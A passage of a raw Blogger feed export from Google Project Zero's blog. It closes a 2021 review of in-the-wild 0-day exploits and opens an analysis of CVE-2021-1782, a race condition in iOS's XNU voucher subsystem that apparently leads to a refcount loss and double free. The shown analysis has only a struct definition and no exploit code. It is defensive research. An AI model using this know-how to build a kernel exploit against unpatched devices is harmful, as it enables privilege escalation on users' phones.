vulnerability is turned into something useful). &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Unfortunately, this report could only really analyze one of these components: the vulnerability. Out of the 58 0-days, only 5 have an exploit sample publicly available. Discovered in-the-wild 0-days are the failure case for attackers and a key opportunity for defenders to learn what attackers are doing and make it harder, more time-intensive, more costly, to do it again. Yet without the exploit sample or a detailed technical write-up based upon the sample, we can only focus on fixing the vulnerability rather than also mitigating the exploitation method. This means that attackers are able to continue to use their existing exploit methods rather than having to go back to the design and development phase to build a new exploitation method. While acknowledging that sharing exploit samples can be challenging (we have that challenge too!), we hope in 2022 there will be more &lt;/span&gt;&lt;span&gt;sharing of exploit samples or detailed technical write-ups so that we can come together to use every possible piece of information to make it harder for the attackers to exploit more users.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;As an aside, if you have an exploit sample that you&amp;rsquo;re willing to share with us, please reach out. Whether it&amp;rsquo;s sharing with us and having us write a detailed technical description and analysis or having us share it publicly, we&amp;rsquo;d be happy to work with you.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"HNYIspzEBn-c11\" id=\"h.e19lp542ae55\"&gt;&lt;span&gt;Conclusion&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Looking back on 2021, what comes to mind is &lt;/span&gt;&lt;span&gt;&amp;ldquo;baby steps&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;rdquo;. We can see clear industry improvement in the detection and disclosure of 0-day exploits. But the better detection and disclosure has highlighted other opportunities for progress. As an industry we&amp;rsquo;re not making 0-day hard. Attackers are having success using vulnerabilities similar to what we&amp;rsquo;ve seen previously and in components that have previously been discussed as attack surfaces.The goal is to force attackers to start from scratch each time we detect one of their exploits: they&amp;rsquo;re forced to discover a whole new vulnerability, they have to invest the time in learning and analyzing a new attack surface, they must develop a brand new exploitation method. &amp;nbsp;And while we made distinct progress in detection and disclosure it has shown us areas where that can continue to improve.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;While this all may seem daunting, the promising part is that we&amp;rsquo;ve done it before: we have made clear progress on previously daunting goals. In 2019, we discussed the large detection deficit for 0-day exploits and 2 years later more than double were detected and disclose&lt;/span&gt;&lt;span&gt;d&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;. So while there is still plenty more work to do, it&amp;rsquo;s a tractable problem. There are concrete steps that the tech and security industries can take to make it even more progress:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c6 lst-kix_czzguda5pqu4-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Make it an industry standard behavior for all vendors to publicly disclose when there is evidence to suggest that a vulnerability in their product is being exploited,&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Vendors and security researchers sharing exploit samples or detailed descriptions of the exploit techniques.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 li-bullet-0\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;Continued concerted efforts on reducing memory corruption vulnerabilities or rendering them unexploitable.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;Through 2021 we continually saw the real world impacts of the use of 0-day exploits against users and entities. Amnesty International, the Citizen Lab, and others highlighted &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://citizenlab.ca/2021/10/breaking-news-new-york-times-journalist-ben-hubbard-pegasus/\"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.amnesty.org/en/documents/doc10/4491/2021/en/\"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;how governments were using commercial surveillance products against &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://forbiddenstories.org/pegasus-the-new-global-weapon-for-silencing-journalists/\"&gt;journalists&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.amnesty.org/en/latest/research/2021/11/devices-of-palestinian-human-rights-defenders-hacked-with-nso-groups-pegasus-spyware-2/\"&gt;human rights defenders&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.reuters.com/technology/exclusive-us-state-department-phones-hacked-with-israeli-company-spyware-sources-2021-12-03/\"&gt;government officials&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. We saw many enterprises scrambling to remediate and protect themselves from the&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\"&gt;Exchange Server 0-days&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. And we even learned of peer &lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://blog.google/threat-analysis-group/update-campaign-targeting-security-researchers/\"&gt;security researchers being targeted by &lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c1\"&gt;&lt;a class=\"HNYIspzEBn-c31\" href=\"https://blog.google/threat-analysis-group/update-campaign-targeting-security-researchers/\"&gt;North Korean government hackers&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;. While the majority of people on the planet do not need to worry about their own personal risk of being targeted with 0-days, 0-day exploitation still affects us all. These 0-days tend to have an outsized impact on society so we need to continue doing whatever we can to make it harder for attackers to be successful in these attacks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c2\"&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HNYIspzEBn-c5\"&gt;&lt;span&gt;2021 showed us we&amp;rsquo;re on the right track and making progress, but there&amp;rsquo;s plenty more to be done to make &lt;/span&gt;&lt;span&gt;0-day&lt;/span&gt;&lt;span class=\"HNYIspzEBn-c0\"&gt;&amp;nbsp;hard.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/3023870154175197326/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/3023870154175197326"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/3023870154175197326"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html","@title":"The More You Know, The More You Know You Don’t Know"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC72HVhQEdwHNIzMiyb18bUFr6hPCWJiKL2Mm43-tW11qc0ucOPI8A9oChEXQe0-QNOBF83SIcfyjcyvPveuWvgipbiBzHWqZTx2-LilJFYIbx6uQeno9f481HJQ0CgylQkh8Ks7AbGC6tjhYDNBcI7jh6ihhzJATA0r_P4bQUBm-1lmHp2DPvWM6I/s72-c/image1%287%29.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-5933797027217125856","published":"2022-04-14T08:58:00.002-07:00","updated":"2022-08-24T12:02:07.319-07:00","title":{"@type":"text","#text":"CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.BGLtzooHlW-c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.BGLtzooHlW-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,\"Courier New\";font-style:normal}.BGLtzooHlW-c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.BGLtzooHlW-c20{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.BGLtzooHlW-c26{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.BGLtzooHlW-c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;font-weight:700;text-decoration:underline}.BGLtzooHlW-c18{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.BGLtzooHlW-c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.BGLtzooHlW-c16{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.BGLtzooHlW-c2{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.BGLtzooHlW-c7{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.BGLtzooHlW-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.BGLtzooHlW-c4{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.BGLtzooHlW-c15{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.BGLtzooHlW-c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.BGLtzooHlW-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.BGLtzooHlW-c6{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.BGLtzooHlW-c12{border-spacing:0;border-collapse:collapse;margin-right:auto}.BGLtzooHlW-c27{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.BGLtzooHlW-c25{color:inherit;text-decoration:inherit}.BGLtzooHlW-c11{font-weight:400;font-family:\"Courier New\"}.BGLtzooHlW-c5{orphans:2;widows:2}.BGLtzooHlW-c1{height:0pt}.BGLtzooHlW-c14{font-style:italic}.BGLtzooHlW-c28{vertical-align:super}.BGLtzooHlW-c8{height:11pt}.BGLtzooHlW-c17{font-weight:700}.BGLtzooHlW-c22{margin-left:36pt}.BGLtzooHlW-c23{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"BGLtzooHlW-c27\"&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;This blog post is my analysis of a vulnerability exploited in the wild and patched in early 2021. Like the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c9\"&gt;&lt;a class=\"BGLtzooHlW-c251\" href=\"https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html\"&gt;writeup published last week&lt;/a&gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;&amp;nbsp;looking at an ASN.1 parser bug, this blog post is based on the notes I took as I was analyzing the patch and trying to understand the XNU vouchers subsystem. I hope that this writeup serves as the missing documentation for how some of the internals of the voucher subsystem works and its quirks which lead to this vulnerability.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;CVE-2021-1782 was fixed in iOS 14.4, as noted by &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c21\"&gt;&lt;a class=\"BGLtzooHlW-c251\" href=\"https://twitter.com/s1guza/status/1354575808547999744\"&gt;@s1guza on twitter&lt;/a&gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c5 BGLtzooHlW-c24\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s1182/image1%20%283%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s1182/image1%20%283%29%281%29.png\" border=\"0\" alt=\"&amp;quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &amp;quot;e_made&amp;quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&amp;quot;\" style=\"max-height: 750; max-width: 600px;\" title=\"&amp;quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &amp;quot;e_made&amp;quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&amp;quot;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;This vulnerability was fixed on January 26th 2021, and Apple updated the iOS 14.4 release notes on May 28th 2021 to indicate that the issue may have been actively exploited:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz_bD89bznHVJLkW_Kbwy-1JEoHaUyMfeaqDbpVjRTQ366r8ywGgSGps2aPyFa05wBuKWqAi2hJmm76dnbcgoV4YCFug4UWu3OhkHPgKjg6coamg35AId8VsOw5gkIHldyvefgRSX0klbhJ275wnwri6dzSTb_OZwwz2LeUeVjmHIAPsyirypsYonn/s1660/image2%20%282%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz_bD89bznHVJLkW_Kbwy-1JEoHaUyMfeaqDbpVjRTQ366r8ywGgSGps2aPyFa05wBuKWqAi2hJmm76dnbcgoV4YCFug4UWu3OhkHPgKjg6coamg35AId8VsOw5gkIHldyvefgRSX0klbhJ275wnwri6dzSTb_OZwwz2LeUeVjmHIAPsyirypsYonn/s1200/image2%20%282%29%281%29.png\" border=\"0\" alt=\"Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021\" style=\"max-height: 750; max-width: 600px;\" title=\"Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.iaaooqfddqk2\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;Vouchers&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;What exactly is a voucher?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;The kernel code has a concise description:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c22\"&gt;&lt;span class=\"BGLtzooHlW-c14 BGLtzooHlW-c26\"&gt;Vouchers are a reference counted immutable (once-created) set of indexes to particular resource manager attribute values (which themselves are reference counted).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;That definition is technically correct, though perhaps not all that helpful by itself.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;To actually understand the root cause and exploitability of this vulnerability is going to require covering a lot of the voucher codebase. This part of XNU is pretty obscure, and pretty complicated.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;A voucher is a reference-counted table of keys and values.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Pointers to all created vouchers are stored in the global &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivht_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;For a particular set of keys and values there should only be one voucher object. During the creation of a voucher there is a deduplication stage where the new voucher is compared against all existing vouchers in the hashtable to ensure they remain unique, returning a reference to the existing voucher if a duplicate has been found.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Here&amp;#39;s the structure of a voucher:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.172bf3f0517e74698dccf6803d0a7cba3e4db4b2\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* checksum hash */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_sum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* checksum of values */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; os_refcnt_t &amp;nbsp; &amp;nbsp;iv_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* reference count */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* size of the voucher table */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_inline_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IV_ENTRIES_INLINE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_entry_t &amp;nbsp; &amp;nbsp; iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* table of voucher attr entries */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_port_t &amp;nbsp; &amp;nbsp; iv_port&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* port representing the voucher */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; queue_chain_t &amp;nbsp;iv_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* link on hash chain */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;\n 